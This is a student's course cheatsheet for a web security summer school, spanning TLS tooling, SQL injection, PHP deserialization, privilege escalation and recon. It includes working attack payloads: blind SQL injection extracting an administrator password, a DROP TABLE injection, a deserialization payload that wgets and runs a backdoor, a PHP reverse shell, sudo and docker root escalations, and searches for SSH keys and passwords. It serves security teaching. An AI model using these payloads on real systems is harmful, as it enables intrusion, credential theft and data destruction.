# Security Summer School Cheatsheet

- Useful so far for midterm

## Session 01: Web Basics ([course](https://security-summer-school.github.io/web/web-basics-browser-security-model/))

Stateful (sessions) vs Stateless (no memory)

Static (fast & simple) vs Dynamic (complex & customizable)

CVE - database of known vulnerabilities of a site (CVE-year-code) => cpe (vulnerable platforms)
CWE - database of known vulnerabilities group by effect

HTTP - protocol on port 80
HTTPS - protocol on port 443

## Session 02 - Cookies, Sessions & Access Control ([course](https://security-summer-school.github.io/web/cookies-session-management-access-control/))

cookies = stored info on client part (HttpOnly (criptare) + Secure (in http si https))

![depiction of session](./02-cookies-sessions-access/curs/assets/session.jpg)

hijacking cookies -> hijacking session

RBAC = role-based access control

exploit-db: dorks

- crawlers:

```
robots.txt sitemap.xml
```

## Session 03 - Securing Communication ([course](https://security-summer-school.github.io/web/securing-communication/))

TLS Handshake = key communication

D.F.K.E. = Diffie-Hellman Key Exchange: private + public key algorithms

CA = certification authority (has certificate signed by self)

Exchange: Public & Private Keys, Certificate (confirmation, name of key owner, name of CA)

![exchange](./03-securing-communication/curs/assets/public-key-encryption.svg)

commands:

- Capture HTTP packets and print their contents (ash human-readable ASCII characters):
```
sudo tcpdump -A tcp port 80
```
- Get remote web page:
```
wget http://www.google.com
```
```
wget https://www.google.com
```
```
curl http://www.google.com
```
```
curl https://www.google.com
```
- Inspect certificate file:
```
openssl x509 -noout -text -in certificate.crt
```
```
openssl x509 -noout -subject -issuer -in certificate.crt
```
- Verify certificate:
```
openssl verify -CAfile CA.crt certificate.crt
```
- Extract certificate(s) from remote end:
```
openssl s_client -showcerts -connect www.google.com:443 -servername www.google.com < /dev/null 2> /dev/null | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'
```
- Assess remote HTTPS and certificate security:
```
./testssl.sh security.cs.pub.ro
```


/etc/ssl/certs/ca-certificates.crt -> all possible root certificates

## Session 04 - SQL Injection ([course](https://security-summer-school.github.io/web/sql-injection/))


SQL injection examples
There are a wide variety of SQL injection vulnerabilities, attacks, and techniques, which arise in different situations.
Some common SQL injection examples include:

Retrieving hidden data - you can modify an SQL query to return additional results.
```
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
Subverting application logic - you can change a query to interfere with the application’s logic.
```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
UNION attacks - you can retrieve data from different database tables.

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

UNION key requirements must be met:
- individual queries must return same nr of columns.
- data types in each column must be compatible between the individual queries.

How to find out the nr of columns

```
' ORDER BY N --
```

The second method involves submitting a series of UNION SELECT payloads specifying a different number of null values:

```
' UNION SELECT NULL,NULL,NULL--
```
After nr of columns, use values to determine data type and outputs

```
' UNION SELECT 'a',NULL,NULL,NULL--
```

```
' UNION SELECT username, password FROM users--
```

Examining the database - you can extract information about the version and structure of the database.

```
SELECT * FROM v$version
```
Determine what database tables exist, and which columns they contain
```
SELECT * FROM information_schema.tables
```

Different databases provide different ways of querying their version.

- Microsoft, MySQL	SELECT @@version
- Oracle	SELECT * FROM v$version
- PostgreSQL	SELECT version()

```
' UNION SELECT @@version--
```

Blind SQL injection - the results of a query you control are not returned in the application’s responses.

Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4

SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'

This query is vulnerable to SQL injection, but the results from the query are not returned to the user.

Check how server responds (change of cookie, delays)
```
xyz' AND '1'='1
```
```
xyz' AND '1'='2
```
This returns the “Welcome back” message, indicating that the injected condition is true.

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

Next input knowing password is greater than m (we find out not greater than t)
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```

```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```

Inducing conditional responses by triggering SQL errors

```
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
We determine what letters are right
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Exploiting blind SQL injection by triggering time delays
```
'; IF (1=2) WAITFOR DELAY '0:0:10'-- '; IF (1=1) WAITFOR DELAY '0:0:10'--
```
We can retrieve data in the way already described, by systematically testing one character at a time:
```
'; IF (SELECT COUNT(username) FROM Users WHERE username = 'Administrator' AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
Second Order SQL Injection - payload already stored in the database intentionally placed it can be triggered elsewhere

Example

```
$sql = "INSERT INTO user (username, password)  VALUES (:username, :password)";
$data = [
        'username' => $userName,
        'password' => $password,
        'first_name' => $firstName,
        'second_name' => $secondName
        ];
$stmt = $conn->prepare($sql);
$stmt->execute($data);
```

Introduces the following structure as a name:

```
'; DROP TABLE user; --
```
We select the user by name use the following code:
```
$sql = "SELECT * FROM user WHERE username = '{$userName}'";
$stmt = $conn->query($sql);
$user = $stmt->fetch();
```
We do not use the parameterization => the code that will be executed:
```
SELECT * FROM user WHERE username = ''; DROP TABLE user; --';
```

How to prevent SQL injection - prepared statements

Vulnerable Code
```
String query = "SELECT * FROM products WHERE category = '" + input + "'";
Statement statement = connection.createStatement();
ResultSet resultSet = statement.executeQuery(query);
```

Good Code
```
PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
statement.setString(1, input);
ResultSet resultSet = statement.executeQuery();
```

# Session 05 - Cross Site Scripting ([course](https://github.com/costaalacuparmare/security-summer-school-v10/blob/master/web/05-cross-site-scripting/README.md))

Tools:
- [sqlmap](https://github.com/sqlmapproject/sqlmap)
- [xssstrike](https://github.com/sqlmapproject/sqlmap)
- [owasp zap](https://www.zaproxy.org/download/)

Resources:
- [XSS types of attacks](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md)
- [XSS Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

# Session 06 - Recon & Enumeration ([course](https://security-summer-school.github.io/web/recon-enumeration/))

Tools:
- [nmap](https://insecure.org/)
- [burp](https://portswigger.net/burp)
- [dirb](https://www.kali.org/tools/dirb/)

```
dirb <ip-address> <known-extensions-file.txt>
```

DVWA - web container used to train for vulnerabilities

```
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

Resources:
- [Shodan](https://www.shodan.io/)
- [Shodan Guide](https://www.safetydetectives.com/blog/what-is-shodan-and-how-to-use-it-most-effectively/)
- [Testing tools](https://hackr.io/blog/top-10-open-source-security-testing-tools-for-web-applications)
- [Enumeration](https://www.knowledgehut.com/blog/security/enumeration-in-ethical-hacking)
- [Fuzzing wordlist](https://github.com/Bo0oM/fuzz.txt)
- [Pathways](https://github.com/aels/subdirectories-discover)
- [Known Credentials](https://github.com/danielmiessler/SecLists)

Bug Bounty Program Lists:

- [List 1](https://github.com/projectdiscovery/public-bugbounty-programs/blob/master/chaos-bugbounty-list.json)
- [List 2](https://www.bugcrowd.com/bug-bounty-list/)
- [List 3](https://hackerone.com/bug-bounty-programs)

# Session 07 - Framework & APIs' vulnerabilities ([course](https://security-summer-school.github.io/web/framework-api-vulnerabilities/))

Application programming interfaces (APIs):

- Broken Object Level Auth: can request information from an API endpoint
- Broken Authentication: dictionary/ brute force attacks allowed
- Excessive Data Exposure: An user can access lists of other items not needed for his access
- Lack of Resources & Rate Limiting: DoS attacks and endpoint outages (make too many requests)
- Broken Function Level Authorization: find endpoints that are vulnerable to requests (by modifying he sent data)
- Mass Assignment: update information that should not be accessed by showing the request with the information
- Security Misconfiguration: Using known systems without updates and being already cracked online (on Shodan)
- Injection: SQli, XSS, etc, but used like: "WAITFOR DELAY '0:0:5'-" therefore detecting a vulnerability
- Improper Assets Management: Access to undeleted previous APIs versions
- Insufficient Logging & Monitoring: Attacks slip away for as much as 200 days

Framework = software designed to ease the development of web applications (DB access, input filtering, auth, session handling, templates)

There are several different types of web application frameworks:
* General purpose website frameworks (Ruby On Rails, ExpressJS, Django, Flask)
* Discussion forums, wikis and weblogs (WikiBase/WikiWikiWeb)
* Organizational portals (JBoss Portal)
* Content Management Systems (CMS) (Joomla, Drupal, Wordpress)

Frameworks and the vulnerabilities:

- [Laravel](https://customerthink.com/what-makes-laravel-the-most-preferred-php-framework-for-web-development/): 2019 SQL Injection detected; vulnerable versions: Laravel 5.6/5.7/5.8 w/ Laravel-query-builder < v1.17.1 and 5.5 w/ query-builder < v1.16.1
- Drupal: 2018 Patch for form rendering that could execute code sent in the image field [POC] (https://github.com/a2u/CVE-2018-7600/blob/master/exploit.py); vulnerable versions: Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 /< 7.58
- WordPress: CVE-2018-6389 (DoS): [expoit live](https://www.youtube.com/watch?v=nNDsGTalXS0&feature=youtu.be)

DVWP - [Damn Vulnerable WordPress] (https://github.com/vavkamil/dvwp)

Tools:
- [WPScan](https://wpscan.com/wordpress-security-scanner)
- [BuiltWith](https://builtwith.com/)
- [Wappalyzer](https://www.wappalyzer.com/)

# Session 8: Exotic Attacks ([course](https://security-summer-school.github.io/web/exotic-attacks/))

- PHP Type Juggling: variables like Python, loose Comparison (`==`) vs. strict Comparison (`===`) => exploit in logins

	*How to avoid*:
	strict comparison/ specification of comparisons in functions;
	typecast in the clause, not before it ( (int) string => saves the first number from the string);


- Magic hashes: hashes that start w/ `0e` => `md5()`, used to crack passwords using
md5 known hashes

| Hash Type | Hash Length | "Magic" Number / String | Magic Hashes                              | Found By                |
| --------- | ----------- | ----------------------- | ----------------------------------------- | ----------------------- |
| md2     | 32    | 505144726             | 0e015339760548602306096794382326          | WhiteHat Security, Inc. |
| md4     | 32    | 48291204              | 0e266546927425668450445617970135          | WhiteHat Security, Inc. |
| md5     | 32    | 240610708             | 0e462097431906509019562988736854          | Michal Spacek           |
| md5     | 32    | QNKCDZO             | 0e830400451993494058024219903391          | -                       |
| sha1      | 40    | 10932435112             | 0e07766915004133176347055865026311692244  | Independently found by Michael A. Cleverly & Michele Spagnuolo & Rogdham |
| sha224    | 56    | –                     | –                                         | –                       |
| sha256    | 64    | –                     | –                                         | –                       |
| sha384    | 96    | –                     | –                                         | –                       |
| sha512    | 128   | –                     | –                                         | –                       |
| ripemd128 | 32    | 315655854             | 0e251331818775808475952406672980          | WhiteHat Security, Inc. |
| ripemd160 | 40    | 20583002034             | 00e1839085851394356611454660337505469745  | Michael A Cleverly      |


- Bypassing `strcmp()` function possible with giving array as input (`password[]=x`)


- Using `preg_replace()` to execute commands (example: `?replace=/Known/e&with=system(‘whoami’)`) => code injection w/
[PCRE modification flags](https://www.php.net/manual/en/reference.pcre.pattern.modifiers.php); function is  **deprecated** since **PHP 5.5.0**, and **removed completely** in **PHP 7.0.0**, because of its recklessly insecure nature.
The replacement function is called `preg_replace_callback()`, which uses a callback.


- PHP Object Injection / PHP Insecure Object Deserialization: application level vulnerability that could allow an attacker to perform different kinds of malicious attacks,
such as Code Injection, SQL Injection, Path Traversal and Application Denial of Service;
The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the `unserialize()`
PHP function.

	Comprehensive list of PHP magic methods would be this one:

|                    |                  |                   |
| ------------------ | ---------------- | ----------------- |
| `__construct()`    | `__set()`        | `__toString()`    |
| `__destruct()`     | `__isset()`      | `__invoke()`      |
| `__call()`       | `__unset()`      | `__set_state()`   |
| `__callStatic()`   | `__sleep()`      | `__clone()`       |
| `__get()`          | `__wakeup()`     | `__debugInfo()`   |

- Exploit with the `__wakeup` in the `unserialize()` function

```php
<?php
    class PHPObjectInjection {
        public $inject;
        function __construct() {

        }
        function __wakeup() {
            if (isset($this->inject)) {
                eval($this->inject);
            }
        }
    }
    if (isset($_REQUEST['r'])) {
        $var1 = unserialize($_REQUEST['r']);
        if (is_array($var1)) {
            echo "<br/>" . $var1[0] . " - " . $var1[1];
        }
    } else {
        echo ""; # nothing happens here
    }
?>
```

Payload:

```
# Basic serialized data
a:2:{i:0;s:4:"XVWA";i:1;s:33:"Xtreme Vulnerable Web Application";}

# Command execution
O:18:"PHPObjectInjection":1:{s:6:"inject";s:17:"system('whoami');";}
```

This vulnerability is **extremely dangerous**, as it could also lead to an **RCE (Remote Code Execution)** exploit.
An attacker could use a payload which downloads a script and starts a reverse shell connected to the web server.
The payload could look like this:

```php
<?php
    class PHPObjectInjection
    {
        // Change URL/ filename to match your setup
        public $inject = "system('wget http://URL/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";
    }
    echo urlencode(serialize(new PHPObjectInjection));
?>
```

- Authentication bypass - Type juggling

```php
<?php
    include("credentials.php");

    // $adminName = "random";
    // $adminPassword = "pass";

    $data = unserialize($_COOKIE['auth']);

    if ($data['username'] == $adminName && $data['password'] == $adminPassword) {
        echo "You logged in as admin!";
    } else {
        echo "Login failed!";
    }
?>
```

Payload: `a:2:{s:8:"username";b:1;s:8:"password";b:1;}`

- Local File Inclusion (LFI) / Remote File Inclusion (RFI)

	**LFI** attack => **Information Disclosure**, **Remote Code Execution (RCE)**, **Cross-site Scripting (XSS)**,
**Path Traversal**.
	
	**RFI** attack => can cause the web application to include a remote file.
This is possible for web applications that dynamically include external files or scripts (bad sanitization).
Potential web security consequences of a successful **RFI** attack range from **Sensitive Information Disclosure** and
**Cross-site Scripting (XSS)** to **Remote Code Execution (RCE)** and, as a final result, **full system compromise**.

**Reverse shell in PHP**:

```php
<?php
    $sock = fsockopen("127.0.0.1",1234);
    $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```
- Python Insecure Deserialization / `pickle` module : the `pickle` lets you serialize and deserialize data.
Essentially, this means that you can convert a Python object into a stream of bytes and then reconstruct it later; 
`pickle.dumps()` te serialize data
```python
import pickle

pickle.dumps(['pickle', 'me', 1, 2, 3])
```

The pickled representation we’re getting back from dumps will look like this:

`b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e'`

And now reading the serialized data back in...

```python
import pickle

pickle.loads(b'\x80\x04\x95\x19\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x06pickle\x94\x8c\x02me\x94K\x01K\x02K\x03e.')
```

...will give us our list object back:

```python
['pickle', 'me', 1, 2, 3]
```


# Session 9 - Privilege Escalation ([course](./09-privilege-escalation/curs/README.md))

 - Privilege escalation: security issues that allow users to gain more permissions and a higher level of access
There are two main types of privilege escalation:
1. **Horizontal Privilege Escalation** is when a user gains the access rights of another user who has the same access level as he or she does.
2. **Vertical Privilege Escalation** is when an attacker uses a flaw in the system to gain access above what was intended for him or her.

- Application vs System PrivEsc
1. **Application Privilege Escalation** is when the attacker uses the application accounts to gain further access to application functionality.
2. **System Privilege Escalation** is when the attacker has already gained access to the underlying system where the web application runs and wishes to elevate his privileges to the administrator's account of the server.
Associated w/ RCE vulnerability, BAC, **Session Hijacking**

- System Vectors (enum)

1. **Kernel Exploit**
	- CVE-2016-5195 ([DirtyCow](https://dirtycow.ninja/)) - Linux Kernel <= `3.19.0-73.8`.
		A race condition was found in the way the Linux kernel's memory subsystem handled the copy-on-write (COW) breakage of private read-only memory mappings. An unprivileged local user could use this flaw to gain write access to otherwise read-only memory mappings and thus increase their privileges on the system.
	- sudo <= `v1.28`
		```bash
		> sudo -u#-1 /bin/bash
		```
	- More kernel exploits in this Git repos: [@lucyoa](https://github.com/lucyoa/kernel-exploits), [@offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).
2. **Exploiting SUDO Rights / SUID Binaries**
	- Sudo configuration might allow a user to execute some command with another user privileges without knowing the password:
		 ```bash
		 > sudo -l
		 User demo may run the following commands on demo-host:
			(root) NOPASSWD: /usr/bin/vim
		 ```
		 This would allow the attacker to create a privileged shell:
		 ```bash
		 > sudo vim -c '!sh'
		 ```
	- SUID Binaries. SUID/Setuid stands for "set user ID upon execution", and it is enabled by default in every Linux distributions. If a file with this bit is ran, the `uid` will be changed by the owner one. If the file owner is `root`, the `uid` will be changed to `root` even if it was executed from user `bob`. SUID bit is represented by an `s`.
		Commands to list SUID binaries:
		```bash
		> find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
		> find / -uid 0 -perm -4000 -type f 2>/dev/null
		```
	- [GTFOBins](https://gtfobins.github.io/) are a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
3. **Path Hijacking**
	- Path Hijacking occurs when a program uses the relative path to another program instead of the absolute path. Consider the following Python code:
		```python
		import os
		os.system('create_backup')
		```
		The `$PATH` variable is a Linux environment variable that specifies where to look for a specific binary when a full path is not provided. An attacker can exploit this mechanism by either being allowed to modify the `$PATH` variable or being able to write files inside directories specified there.
		So, in order to exploit the above Python code, the attacker places a program called `create_backup` inside a location from the `$PATH` variable and Linux will execute the malicious program instead of the intended one.
4. **Docker Privilege Escalation / Container Escape**
	- This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.
		```bash
		> docker run -v /:/mnt --rm -it alpine chroot /mnt sh
		```
		The command above creates a new container based on the `Linux Alpine` image, mounts the `/` directory from the host on `/mnt` inside the container and runs it with `/bin/sh`. Now the attacker can read any file on the system.
	- Escaping Docker privileged containers. Docker privileged containers are those run with the `--privileged` flag. Unlike regular containers, these have root privilege to the host machine. A detailed article can be read [here](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1)
5. **Others**
	- `id` / `whoami` - identify if the user is part of special groups, such as `docker`, `admin`, etc.
	- `cat /etc/passwd` - list system users for potential privilege escalation
	- `crontab -l` / `ls -al /etc/cron* /etc/at*` - enumerate cron jobs (scheduled jobs) on the system.
	- `ps aux` / `ps -ef` - inspect running processes
	- `find / -name authorized_keys 2> /dev/null` - find SSH authorized keys
	- `find / -name id_rsa 2> /dev/null` - find SSH private keys
	- `find / -type f -iname ".*" -ls 2>/dev/null` - find hidden files
	- `grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null` - find files containing passwords.
	- Manually looking through web server logs, such as access or error logs for any sensitive information. Default locations for these logs:
		- `/var/log/apache2/error.log`
		- `/var/log/apache/access.log`
		- `/var/log/apache2/access.log`
		- `/etc/httpd/logs/access_log`

### Tools

- [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

# Session 10 - End to End Attack ([course](./10-end-to-end-attack/curs/README.md))
 
- Phase one: Reconnaissance and Research (`footprinting` stage)

1. **Passive Reconnaissance**: Shodan, Google Dorks, Censys.io, PublicWWW, Zoomeye,
Social Media, WHOIS lookup
2. **Active Reconnaissance**: [nmap](https://nmap.org),[gobuster](https://github.com/OJ/gobuster),[wfuzz](https://github.com/xmendez/wfuzz),[openvas-scanner](https://github.com/greenbone/openvas-scanner)
- Phase two: Weaponization


- Phase three: Gaining Access


- Phase four: Maintaining access: Creating new user accounts, Editing firewall settings, Turning on remote desktop access (RDP), Installing a backdoor via [rootkits](https://en.wikipedia.org/wiki/Rootkit)


- Phase five: Clearing Tracks: MAC, VPNs


- Tools:

	Google Dorks: search for vulnerable versions (WSO2 product after the release of the
[CVE-2022-29464](https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html) so we will use Google Dorks, knowing the vulnerable endpoints of the vulnerable product.

	[Nuclei](https://github.com/projectdiscovery/nuclei) is an important open-source tools used to find vulnerable targets, based on flexible templates written in yaml, which offers to scan for multiple protocols (HTTP, TCP, DNS, ...).
The templates can be found inside the [nuclei-templates](https://github.com/projectdiscovery/nuclei-templates/tree/master/cves) github page, sorted by the CVE release year.
	[Apache Spark](https://spark.apache.org) is an open-source, distributed processing system used for big data workloads and it utilizes in-memory caching, and optimized query execution for fast analytic queries.
Apache Spark also provides a suite of web user interfaces (UI) that you can use to monitor the status and resource consumption of your Spark cluster.
	[RequestBin](https://requestbin.io) gives you a URL that will collect requests made to it and let you inspect them in a human-friendly way.


```
inurl:"/carbon/admin/login.jsp"
inurl:"/authenticationendpoint/login.do"
inurl:"devportal/apis"
intitle:"API Publisher- Login"
intitle:"WSO2 Management Console"
```